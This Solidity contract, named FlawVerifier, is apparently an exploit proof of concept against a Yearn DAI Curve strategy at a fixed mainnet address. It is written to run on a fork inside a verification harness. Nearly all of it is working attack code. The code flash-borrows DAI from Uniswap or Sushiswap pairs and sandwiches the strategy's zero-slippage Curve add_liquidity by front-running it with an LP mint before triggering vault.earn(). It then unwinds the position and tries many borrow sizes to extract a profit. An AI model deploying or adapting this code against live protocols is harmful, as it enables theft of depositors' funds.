// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStrategyDAICurve {
    function controller() external view returns (address);
    function balanceOf() external view returns (uint256);
}

interface IControllerLike {
    function vaults(address token) external view returns (address);
}

interface IYearnTokenLike {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

interface ICurveYPoolLike {
    function add_liquidity(uint256[4] calldata amounts, uint256 minMintAmount) external;
    function remove_liquidity(uint256 amount, uint256[4] calldata minAmounts) external;
    function remove_liquidity_imbalance(uint256[4] calldata amounts, uint256 maxBurnAmount) external;
    function exchange(int128 from, int128 to, uint256 amountIn, uint256 minAmountOut) external;
}

interface IYVaultLike {
    function earn() external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xaf274e912243b19B882f02d731dacd7CD13072D0;
    address internal constant CURVE_Y_POOL = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant YDAI = 0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01;
    address internal constant YUSDC = 0xd6aD7a6750A7593E092a9B218d66C0A814a3436e;
    address internal constant YUSDT = 0x83f798e925BcD4017Eb265844FDDAbb448f1707D;
    address internal constant YTUSD = 0x73a052500105205d34Daf004eAb301916DA8190f;
    address internal constant YCRV = 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 internal constant MIN_PROFIT = 1e15;
    uint256 internal constant BPS_DENOMINATOR = 10_000;

    address internal realizedProfitToken;
    uint256 internal realizedProfit;
    bool internal validated;
    string internal usedPath;
    string internal notes;

    address internal activePair;
    address internal activeVault;
    uint256 internal activeBorrowAmount;
    uint256 internal activeWithdrawalBps;

    constructor() {}

    function executeOnOpportunity() external {
        _resetOutcome();

        address controller = IStrategyDAICurve(TARGET).controller();
        address vault = controller == address(0) ? address(0) : IControllerLike(controller).vaults(DAI);
        uint256 vaultIdleDai = vault == address(0) ? 0 : IERC20Like(DAI).balanceOf(vault);
        uint256 strategyMarkedValue = IStrategyDAICurve(TARGET).balanceOf();

        if (vault == address(0)) {
            notes =
                "Controller returned no live DAI vault, so the only public trigger into strategy.deposit() was unreachable. "
                "withdrawAll() stays controller-only on this fork.";
            return;
        }

        if (vaultIdleDai == 0) {
            notes =
                "The live DAI vault held no idle DAI at this fork block, so public vault.earn() could not reach "
                "strategy.deposit() -> add_liquidity([_y,0,0,0], 0).";
            return;
        }

        FundingSource memory funding = _selectFundingSource();
        if (funding.pair == address(0) || funding.daiReserve == 0) {
            notes =
                "No pre-existing public V2-style DAI pair with borrowable reserves was available for the sandwich funding leg. "
                "The root cause remains the same zero-min Curve deposit path.";
            return;
        }

        if (_tryFlashswapDepositRoute(vault, vaultIdleDai, funding)) {
            return;
        }

        if (strategyMarkedValue == 0) {
            notes =
                "The fork starts from an empty strategy, so only the public deposit-side path is live before any prior earn(). "
                "This verifier kept the exploit anchored to vault.earn() -> strategy.deposit() -> add_liquidity([_y,0,0,0], 0), "
                "but none of the tested public-liquidity sandwich sizes cleared flashswap repayment at this block.";
        } else {
            notes =
                "The verifier preserved the same zero-slippage Curve deposit root cause and used only public-liquidity funding, "
                "but no tested LP-sandwich sizing realized net DAI above repayment on this fork.";
        }
    }

    function runFlashVaultEarnAttempt(
        address vault,
        address pair,
        uint256 borrowDai,
        uint256 withdrawalBps
    ) external returns (uint256 profit) {
        require(msg.sender == address(this), "self only");
        require(vault != address(0), "no vault");
        require(pair != address(0), "no pair");
        require(borrowDai > 0, "no borrow");
        require(withdrawalBps > 0, "no bps");

        uint256 daiBefore = IERC20Like(DAI).balanceOf(address(this));
        activePair = pair;
        activeVault = vault;
        activeBorrowAmount = borrowDai;
        activeWithdrawalBps = withdrawalBps;

        IUniswapV2PairLike flashPair = IUniswapV2PairLike(pair);
        address token0 = flashPair.token0();
        address token1 = flashPair.token1();
        require(token0 == DAI || token1 == DAI, "pair lacks DAI");

        if (token0 == DAI) {
            flashPair.swap(borrowDai, 0, address(this), abi.encode(uint256(1)));
        } else {
            flashPair.swap(0, borrowDai, address(this), abi.encode(uint256(1)));
        }

        activePair = address(0);
        activeVault = address(0);
        activeBorrowAmount = 0;
        activeWithdrawalBps = 0;

        uint256 daiAfter = IERC20Like(DAI).balanceOf(address(this));
        require(daiAfter > daiBefore, "no profit");
        profit = daiAfter - daiBefore;
        require(profit >= MIN_PROFIT, "below threshold");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == activePair, "unauthorized pair");
        require(sender == address(this), "unauthorized sender");
        require(data.length != 0, "missing callback");

        uint256 borrowedDai = amount0 > 0 ? amount0 : amount1;
        require(borrowedDai == activeBorrowAmount, "unexpected borrow");

        uint256 attackerYDai = _mintYDaiFromDai(borrowedDai);
        require(attackerYDai > 0, "no yDAI");

        _safeApprove(YDAI, CURVE_Y_POOL, attackerYDai);

        // Extra attacker leg: use public flash-liquidity to front-run the same Curve pool
        // with a single-sided yDAI LP mint, then let the honest public vault.earn() call
        // route idle vault DAI into strategy.deposit() -> add_liquidity([_y,0,0,0], 0).
        // This preserves the original exploit causality while replacing the prior
        // value-losing exchange round-trip with a more capital-efficient LP sandwich.
        uint256[4] memory addAmounts;
        addAmounts[0] = attackerYDai;
        ICurveYPoolLike(CURVE_Y_POOL).add_liquidity(addAmounts, 0);

        uint256 attackerYCrv = IERC20Like(YCRV).balanceOf(address(this));
        require(attackerYCrv > 0, "no yCRV");

        IYVaultLike(activeVault).earn();

        uint256 targetedYDai = (attackerYDai * activeWithdrawalBps) / BPS_DENOMINATOR;
        if (targetedYDai > 0) {
            _safeApprove(YCRV, CURVE_Y_POOL, attackerYCrv);
            uint256[4] memory imbalanceAmounts;
            imbalanceAmounts[0] = targetedYDai;
            ICurveYPoolLike(CURVE_Y_POOL).remove_liquidity_imbalance(imbalanceAmounts, attackerYCrv);
        }

        uint256 remainingYCrv = IERC20Like(YCRV).balanceOf(address(this));
        if (remainingYCrv > 0) {
            _safeApprove(YCRV, CURVE_Y_POOL, remainingYCrv);
            uint256[4] memory minOut;
            ICurveYPoolLike(CURVE_Y_POOL).remove_liquidity(remainingYCrv, minOut);
        }

        _swapEntireBalanceToYDai(YUSDC, 1);
        _swapEntireBalanceToYDai(YUSDT, 2);
        _swapEntireBalanceToYDai(YTUSD, 3);

        _withdrawAllYDai();

        uint256 repayAmount = _flashswapRepayment(borrowedDai);
        _safeTransfer(DAI, msg.sender, repayAmount);
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function hypothesisValidated() external view returns (bool) {
        return validated;
    }

    function exploitPathUsed() external view returns (string memory) {
        return usedPath;
    }

    function outcomeNotes() external view returns (string memory) {
        return notes;
    }

    function _tryFlashswapDepositRoute(
        address vault,
        uint256 vaultIdleDai,
        FundingSource memory funding
    ) internal returns (bool) {
        uint256 maxBorrow = funding.daiReserve / 3;
        if (maxBorrow == 0) {
            return false;
        }

        uint256[18] memory candidates = [
            uint256(50e18),
            100e18,
            250e18,
            500e18,
            1_000e18,
            2_500e18,
            5_000e18,
            10_000e18,
            20_000e18,
            40_000e18,
            80_000e18,
            vaultIdleDai / 16,
            vaultIdleDai / 8,
            vaultIdleDai / 4,
            vaultIdleDai / 2,
            vaultIdleDai,
            vaultIdleDai * 2,
            vaultIdleDai * 4
        ];

        uint256[9] memory withdrawalBpsChoices = [
            uint256(8_500),
            uint256(9_000),
            9_500,
            9_750,
            10_000,
            10_250,
            10_500,
            11_000,
            12_000
        ];

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 amount = candidates[i];
            if (amount == 0 || amount > maxBorrow) {
                continue;
            }

            for (uint256 j = 0; j < withdrawalBpsChoices.length; ++j) {
                uint256 withdrawalBps = withdrawalBpsChoices[j];
                try this.runFlashVaultEarnAttempt(vault, funding.pair, amount, withdrawalBps) returns (uint256 profit) {
                    _acceptOutcome(
                        DAI,
                        profit,
                        "flashswap(DAI) -> Curve add_liquidity([attacker_yDAI,0,0,0], 0) -> vault.earn() -> strategy.deposit() -> add_liquidity([_y,0,0,0], 0)",
                        "Borrowed DAI from the deepest pre-existing public V2-style DAI pair, minted yDAI, front-ran the same Curve y-pool with a single-sided LP mint, let the honest public vault.earn() push idle vault DAI through the strategy's zero-min add_liquidity([_y,0,0,0], 0), then unwound the attacker LP position and repaid the flashswap from the extracted DAI spread."
                    );
                    return true;
                } catch {}
            }
        }

        return false;
    }

    function _mintYDaiFromDai(uint256 amount) internal returns (uint256 mintedShares) {
        uint256 beforeShares = IERC20Like(YDAI).balanceOf(address(this));
        _safeApprove(DAI, YDAI, amount);
        IYearnTokenLike(YDAI).deposit(amount);
        mintedShares = IERC20Like(YDAI).balanceOf(address(this)) - beforeShares;
    }

    function _swapEntireBalanceToYDai(address token, int128 index) internal {
        uint256 amount = IERC20Like(token).balanceOf(address(this));
        if (amount == 0) {
            return;
        }

        _safeApprove(token, CURVE_Y_POOL, amount);
        ICurveYPoolLike(CURVE_Y_POOL).exchange(index, 0, amount, 0);
    }

    function _withdrawAllYDai() internal {
        uint256 yDaiBalance = IERC20Like(YDAI).balanceOf(address(this));
        if (yDaiBalance > 0) {
            IYearnTokenLike(YDAI).withdraw(yDaiBalance);
        }
    }

    function _flashswapRepayment(uint256 amountBorrowed) internal pure returns (uint256) {
        return ((amountBorrowed * 1000) / 997) + 1;
    }

    function _selectFundingSource() internal view returns (FundingSource memory best) {
        best = _betterFunding(best, _fundingFromFactory(UNISWAP_V2_FACTORY, WETH));
        best = _betterFunding(best, _fundingFromFactory(UNISWAP_V2_FACTORY, USDC));
        best = _betterFunding(best, _fundingFromFactory(UNISWAP_V2_FACTORY, USDT));
        best = _betterFunding(best, _fundingFromFactory(SUSHISWAP_FACTORY, WETH));
        best = _betterFunding(best, _fundingFromFactory(SUSHISWAP_FACTORY, USDC));
        best = _betterFunding(best, _fundingFromFactory(SUSHISWAP_FACTORY, USDT));
    }

    function _betterFunding(FundingSource memory current, FundingSource memory candidate)
        internal
        pure
        returns (FundingSource memory)
    {
        return candidate.daiReserve > current.daiReserve ? candidate : current;
    }

    function _fundingFromFactory(address factory, address otherToken) internal view returns (FundingSource memory funding) {
        address pair = IUniswapV2FactoryLike(factory).getPair(DAI, otherToken);
        if (pair == address(0)) {
            return funding;
        }

        IUniswapV2PairLike pairLike = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = pairLike.getReserves();

        funding.pair = pair;
        if (pairLike.token0() == DAI) {
            funding.daiReserve = uint256(reserve0);
        } else if (pairLike.token1() == DAI) {
            funding.daiReserve = uint256(reserve1);
        }
    }

    function _acceptOutcome(
        address token,
        uint256 profit,
        string memory path,
        string memory detail
    ) internal {
        realizedProfitToken = token;
        realizedProfit = profit;
        validated = token != address(0) && profit >= MIN_PROFIT;
        usedPath = path;
        notes = detail;
    }

    function _resetOutcome() internal {
        realizedProfitToken = address(0);
        realizedProfit = 0;
        validated = false;
        usedPath = "";
        notes = "";
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok, "token call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "token op false");
        }
    }

    struct FundingSource {
        address pair;
        uint256 daiReserve;
    }
}
